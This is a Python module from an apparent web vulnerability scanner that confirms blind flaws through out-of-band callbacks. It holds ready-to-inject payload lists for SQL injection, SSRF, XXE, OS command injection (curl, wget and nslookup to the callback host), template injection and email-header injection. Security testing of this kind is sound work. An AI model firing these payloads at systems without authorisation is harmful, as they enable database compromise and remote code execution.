"""
OOBManager — Manages out-of-band callback tracking for blind vulnerability detection.

Generates unique callback URLs per payload, tracks payload→callback mappings,
polls for received interactions, and correlates callbacks to original payloads
to confirm blind vulnerabilities (SQLi, SSRF, XXE, RCE, SSTI, LDAP).
"""
import logging
import secrets
import time
from typing import Optional

from .interactsh_client import InteractshClient

logger = logging.getLogger(__name__)

# Default polling configuration
DEFAULT_POLL_INTERVAL = 5.0   # seconds between polls
DEFAULT_POLL_TIMEOUT = 120.0  # total seconds to wait for callbacks
MAX_POLL_ATTEMPTS = 24        # 24 * 5s = 120s


class OOBPayload:
    """Represents an OOB payload with its callback tracking metadata."""

    __slots__ = ('vuln_type', 'param_name', 'callback_id', 'callback_url',
                 'payload', 'target_url', 'timestamp')

    def __init__(self, vuln_type: str, param_name: str, callback_id: str,
                 callback_url: str, payload: str, target_url: str):
        self.vuln_type = vuln_type
        self.param_name = param_name
        self.callback_id = callback_id
        self.callback_url = callback_url
        self.payload = payload
        self.target_url = target_url
        self.timestamp = time.monotonic()


class OOBFinding:
    """A confirmed blind vulnerability found via OOB callback."""

    __slots__ = ('vuln_type', 'param_name', 'target_url', 'payload',
                 'callback_url', 'callback_protocol', 'callback_evidence',
                 'remote_address')

    def __init__(self, vuln_type: str, param_name: str, target_url: str,
                 payload: str, callback_url: str, callback_protocol: str,
                 callback_evidence: str, remote_address: str = ''):
        self.vuln_type = vuln_type
        self.param_name = param_name
        self.target_url = target_url
        self.payload = payload
        self.callback_url = callback_url
        self.callback_protocol = callback_protocol
        self.callback_evidence = callback_evidence
        self.remote_address = remote_address


# ── OOB Payload Templates ──────────────────────────────────────────────

# Each template uses {callback} as the OOB URL placeholder.

BLIND_SQLI_OOB_PAYLOADS = [
    # MSSQL xp_dirtree (DNS lookup)
    "'; EXEC master..xp_dirtree '//{callback}/sqli'; --",
    "'; EXEC master..xp_dirtree '\\\\{callback}\\sqli'; --",
    # MSSQL xp_fileexist
    "'; EXEC master..xp_fileexist '\\\\{callback}\\sqli'; --",
    # MySQL LOAD_FILE (DNS/SMB)
    "' UNION SELECT LOAD_FILE('\\\\\\\\{callback}\\\\sqli')-- -",
    "' AND LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\sqli'))-- -",
    # Oracle UTL_HTTP
    "' || UTL_HTTP.REQUEST('http://{callback}/sqli') || '",
    "' || UTL_INADDR.GET_HOST_ADDRESS('{callback}') || '",
    # PostgreSQL COPY
    "'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'; --",
    "'; SELECT dblink_connect('host={callback} dbname=sqli'); --",
]

BLIND_SSRF_OOB_PAYLOADS = [
    'http://{callback}/ssrf',
    'https://{callback}/ssrf',
    'http://{callback}/ssrf?target=internal',
    '//{callback}/ssrf',
    'gopher://{callback}:80/_GET%20/ssrf',
]

BLIND_XXE_OOB_PAYLOADS = [
    # Classic external entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}/xxe">]><root>&xxe;</root>',
    # Parameter entity (bypasses entity restrictions)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}/xxe">%xxe;]><root>test</root>',
    # DTD-based OOB
    '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://{callback}/xxe.dtd"><root>test</root>',
    # SVG XXE with external entity
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://{callback}/xxe">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
]

BLIND_RCE_OOB_PAYLOADS = [
    # nslookup (cross-platform DNS)
    '`nslookup {callback}`',
    '$(nslookup {callback})',
    '; nslookup {callback} ;',
    '| nslookup {callback}',
    # curl (HTTP callback)
    '`curl http://{callback}/rce`',
    '$(curl http://{callback}/rce)',
    '; curl http://{callback}/rce ;',
    '| curl http://{callback}/rce',
    # wget
    '; wget http://{callback}/rce ;',
    # ping (ICMP — may be blocked, but DNS still resolves)
    '; ping -c 1 {callback} ;',
    # PowerShell (Windows)
    '& nslookup {callback} &',
    '| nslookup {callback} ||',
    # Backtick variants
    '`nslookup {callback}`',
]

BLIND_SSTI_OOB_PAYLOADS = [
    # Jinja2/Python
    "{{{{request.__class__.__mro__[2].__subclasses__()[40]('/etc/hostname').read()}}}}",
    # Java-based template engines
    "${{T(java.lang.Runtime).getRuntime().exec('nslookup {callback}')}}",
    # FreeMarker
    '<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("nslookup {callback}")}}',
    # Twig/PHP
    "{{{{['nslookup {callback}']|filter('system')}}}}",
    # Mako
    "${{__import__('os').popen('nslookup {callback}').read()}}",
]

BLIND_LDAP_OOB_PAYLOADS = [
    # LDAP injection with OOB
    '*)(objectClass=*))%00',
    '*()|%26(objectClass=*))',
]

EMAIL_HEADER_OOB_PAYLOADS = [
    # Email header injection with OOB
    '\r\nBcc: oob@{callback}',
    '\nTo: oob@{callback}',
    '%0ABcc:%20oob@{callback}',
    '%0d%0aBcc:%20oob@{callback}',
]

# Map vuln type to payload templates
OOB_PAYLOAD_MAP = {
    'sqli': BLIND_SQLI_OOB_PAYLOADS,
    'ssrf': BLIND_SSRF_OOB_PAYLOADS,
    'xxe': BLIND_XXE_OOB_PAYLOADS,
    'rce': BLIND_RCE_OOB_PAYLOADS,
    'cmdi': BLIND_RCE_OOB_PAYLOADS,
    'ssti': BLIND_SSTI_OOB_PAYLOADS,
    'ldap': BLIND_LDAP_OOB_PAYLOADS,
    'email': EMAIL_HEADER_OOB_PAYLOADS,
}

# Vuln type → vulnerability metadata for _build_vuln()
OOB_VULN_METADATA = {
    'sqli': {
        'name': 'Blind SQL Injection (OOB)',
        'severity': 'critical',
        'category': 'SQL Injection',
        'description': 'Blind SQL injection confirmed via out-of-band DNS/HTTP callback. '
                       'The application executed a SQL query that triggered an external '
                       'network request to an attacker-controlled server.',
        'impact': 'Full database compromise. Attacker can extract all data, modify records, '
                  'and potentially execute OS commands via database features.',
        'remediation': 'Use parameterized queries (prepared statements) for all database '
                       'operations. Never concatenate user input into SQL queries.',
        'cwe': 'CWE-89',
        'cvss': 9.8,
    },
    'ssrf': {
        'name': 'Blind SSRF (OOB)',
        'severity': 'high',
        'category': 'SSRF',
        'description': 'Blind SSRF confirmed via out-of-band callback. The server made a '
                       'request to an attacker-controlled URL, confirming it can be used '
                       'to access internal services.',
        'impact': 'Access to internal services, cloud metadata APIs, and potentially '
                  'sensitive internal resources. May lead to credential theft.',
        'remediation': 'Validate and whitelist allowed URLs. Block requests to internal '
                       'networks and cloud metadata endpoints.',
        'cwe': 'CWE-918',
        'cvss': 8.6,
    },
    'xxe': {
        'name': 'Blind XXE Injection (OOB)',
        'severity': 'high',
        'category': 'XXE',
        'description': 'Blind XML External Entity injection confirmed via out-of-band '
                       'callback. The XML parser resolved an external entity pointing '
                       'to an attacker-controlled server.',
        'impact': 'File disclosure, SSRF, denial of service, and potentially remote '
                  'code execution depending on the XML processor.',
        'remediation': 'Disable external entity processing in the XML parser. Use '
                       'defusedxml or equivalent safe parsing libraries.',
        'cwe': 'CWE-611',
        'cvss': 8.2,
    },
    'rce': {
        'name': 'Blind Remote Code Execution (OOB)',
        'severity': 'critical',
        'category': 'Command Injection',
        'description': 'Blind command injection confirmed via out-of-band callback. '
                       'The server executed an OS command that triggered an external '
                       'DNS lookup to an attacker-controlled domain.',
        'impact': 'Complete server compromise. Attacker can execute arbitrary commands, '
                  'access all data, install backdoors, and pivot to other systems.',
        'remediation': 'Never pass user input to OS commands. Use language-native APIs '
                       'instead of shell commands. Apply input validation and sandboxing.',
        'cwe': 'CWE-78',
        'cvss': 10.0,
    },
    'cmdi': {
        'name': 'Blind Command Injection (OOB)',
        'severity': 'critical',
        'category': 'Command Injection',
        'description': 'Blind OS command injection confirmed via out-of-band callback.',
        'impact': 'Complete server compromise via arbitrary command execution.',
        'remediation': 'Never pass user input to OS commands. Use safe APIs instead.',
        'cwe': 'CWE-78',
        'cvss': 10.0,
    },
    'ssti': {
        'name': 'Blind SSTI (OOB)',
        'severity': 'critical',
        'category': 'SSTI',
        'description': 'Blind Server-Side Template Injection confirmed via out-of-band '
                       'callback. The template engine executed attacker-controlled code.',
        'impact': 'Remote code execution on the server. Full application compromise.',
        'remediation': 'Use a sandboxed template engine. Never pass user input directly '
                       'into template expressions. Use allowlisted template variables.',
        'cwe': 'CWE-1336',
        'cvss': 9.8,
    },
}


class OOBManager:
    """Manages OOB callback infrastructure for a scan.

    Integrates with InteractshClient to generate unique callback URLs,
    track which payloads were injected, and correlate received callbacks
    to confirm blind vulnerabilities.

    Usage:
        manager = OOBManager()
        manager.start()

        # Generate OOB payloads for a specific vuln type + parameter
        payloads = manager.get_oob_payloads('sqli', 'id', 'https://target.com/page')

        # ... inject payloads via testers ...

        # Poll and correlate
        findings = manager.poll_and_correlate()
        manager.stop()
    """

    def __init__(self, server: str = None, token: str = None,
                 poll_interval: float = DEFAULT_POLL_INTERVAL,
                 poll_timeout: float = DEFAULT_POLL_TIMEOUT):
        self._client = InteractshClient(server=server, token=token)
        self._poll_interval = poll_interval
        self._poll_timeout = poll_timeout
        self._tracking: dict[str, OOBPayload] = {}  # callback_id → OOBPayload
        self._active = False

    @property
    def is_active(self) -> bool:
        return self._active

    @property
    def interaction_url(self) -> Optional[str]:
        return self._client.interaction_url

    @property
    def tracked_count(self) -> int:
        return len(self._tracking)

    def start(self) -> bool:
        """Initialize OOB infrastructure. Returns True if successfully started."""
        try:
            self._client.register()
            self._active = True
            logger.info(f'OOB Manager started (interaction URL: {self._client.interaction_url})')
            return True
        except Exception as e:
            logger.warning(f'OOB Manager failed to start: {e}')
            self._active = False
            return False

    def stop(self):
        """Shutdown OOB infrastructure."""
        self._client.close()
        self._active = False
        self._tracking.clear()
        logger.info('OOB Manager stopped')

    def get_oob_payloads(self, vuln_type: str, param_name: str,
                         target_url: str) -> list:
        """Generate OOB payloads for a specific vulnerability type.

        Args:
            vuln_type: Type of blind vulnerability ('sqli', 'ssrf', 'xxe', 'rce', 'ssti', etc.)
            param_name: Name of the parameter being tested.
            target_url: The URL being tested.

        Returns:
            List of (payload_string, callback_id) tuples ready for injection.
        """
        if not self._active or not self._client.interaction_url:
            return []

        templates = OOB_PAYLOAD_MAP.get(vuln_type, [])
        if not templates:
            return []

        payloads = []
        for template in templates:
            callback_id = secrets.token_hex(6)
            label = f'{vuln_type}-{param_name}'
            callback_url = self._client.generate_subdomain(label)

            # Replace {callback} placeholder with actual callback URL
            payload = template.replace('{callback}', callback_url)

            # Track the mapping
            oob_payload = OOBPayload(
                vuln_type=vuln_type,
                param_name=param_name,
                callback_id=callback_id,
                callback_url=callback_url,
                payload=payload,
                target_url=target_url,
            )
            self._tracking[callback_url.split('.')[0]] = oob_payload

            payloads.append((payload, callback_id))

        return payloads

    def poll_and_correlate(self, max_wait: float = None) -> list:
        """Poll for OOB interactions and correlate with tracked payloads.

        Args:
            max_wait: Max seconds to wait for callbacks (default: poll_timeout).

        Returns:
            List of OOBFinding objects for confirmed blind vulnerabilities.
        """
        if not self._active or not self._tracking:
            return []

        max_wait = max_wait or self._poll_timeout
        findings = []
        start_time = time.monotonic()
        attempts = 0

        while (time.monotonic() - start_time) < max_wait and attempts < MAX_POLL_ATTEMPTS:
            interactions = self._client.poll()

            for interaction in interactions:
                finding = self._correlate_interaction(interaction)
                if finding:
                    findings.append(finding)
                    logger.info(
                        f'OOB confirmed: {finding.vuln_type} via {finding.callback_protocol} '
                        f'callback for {finding.param_name} at {finding.target_url}'
                    )

            # If we found callbacks, do one more poll then stop
            if findings:
                # One final poll to catch any remaining callbacks
                time.sleep(self._poll_interval)
                extra = self._client.poll()
                for interaction in extra:
                    finding = self._correlate_interaction(interaction)
                    if finding:
                        findings.append(finding)
                break

            attempts += 1
            time.sleep(self._poll_interval)

        if not findings:
            logger.debug(f'OOB poll completed with no callbacks after {attempts} attempts')

        return findings

    def _correlate_interaction(self, interaction) -> Optional[OOBFinding]:
        """Correlate a received interaction with a tracked OOB payload."""
        # The interaction's full_id contains our label as a subdomain prefix
        full_id = interaction.full_id.lower()
        unique_id = interaction.unique_id.lower()

        # Search tracking dict for matching callback
        for key, oob_payload in self._tracking.items():
            if key.lower() in full_id or key.lower() == unique_id:
                evidence = (
                    f'OOB callback received: protocol={interaction.protocol}, '
                    f'from={interaction.remote_address}, '
                    f'callback_url={oob_payload.callback_url}, '
                    f'raw_request={interaction.raw_request[:500]}'
                )
                return OOBFinding(
                    vuln_type=oob_payload.vuln_type,
                    param_name=oob_payload.param_name,
                    target_url=oob_payload.target_url,
                    payload=oob_payload.payload,
                    callback_url=oob_payload.callback_url,
                    callback_protocol=interaction.protocol,
                    callback_evidence=evidence,
                    remote_address=interaction.remote_address,
                )

        return None

    def findings_to_vulns(self, findings: list) -> list:
        """Convert OOBFinding objects to vulnerability dicts for _build_vuln().

        Returns:
            List of dicts ready for Vulnerability.objects.create().
        """
        vulns = []
        for finding in findings:
            meta = OOB_VULN_METADATA.get(finding.vuln_type)
            if not meta:
                continue

            vulns.append({
                'name': meta['name'],
                'severity': meta['severity'],
                'category': meta['category'],
                'description': meta['description'],
                'impact': meta['impact'],
                'remediation': meta['remediation'],
                'cwe': meta['cwe'],
                'cvss': meta['cvss'],
                'affected_url': finding.target_url,
                'evidence': (
                    f'Parameter: {finding.param_name}\n'
                    f'Payload: {finding.payload[:500]}\n'
                    f'Callback: {finding.callback_protocol} to {finding.callback_url}\n'
                    f'{finding.callback_evidence}'
                )[:2000],
                'oob_callback': finding.callback_url[:255],
            })

        return vulns
